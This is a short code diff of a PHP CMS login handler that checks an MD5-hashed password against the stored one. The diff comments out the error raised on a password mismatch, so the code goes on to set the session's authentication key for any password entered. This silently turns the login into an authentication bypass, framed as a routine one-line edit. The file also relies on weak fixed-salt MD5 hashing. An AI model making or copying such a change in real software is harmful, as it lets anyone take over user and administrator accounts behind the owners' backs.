@@ -67,7 +67,7 @@ class PublicAction extends Action
 		$pwdinfo = strcmp($authInfo['password'],md5('wk'.trim($_POST['password']).'cms'));
 		if($pwdinfo <> 0)
 		{
-			$this->error('密码错误!');
+			//$this->error('密码错误!');
     }
     
     $_SESSION[C('USER_AUTH_KEY')]	=	$authInfo['id'];
